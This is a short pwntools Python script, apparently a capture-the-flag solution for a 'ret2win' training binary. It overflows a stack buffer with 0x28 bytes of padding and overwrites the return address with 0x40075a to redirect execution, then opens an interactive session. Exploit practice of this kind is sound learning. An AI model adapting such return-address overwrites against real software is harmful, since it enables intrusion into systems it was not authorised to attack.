#!/usr/bin/python3

from pwn import *

ret = 0x000000000040075a

p = process('./ret2win')

payload = b'a' * 0x20 + b'b' * 0x8 + p64(ret)
f = open("./payload", "wb")
f.write(payload)
f.close()
p.sendlineafter('read()!\n', payload)

p.interactive()
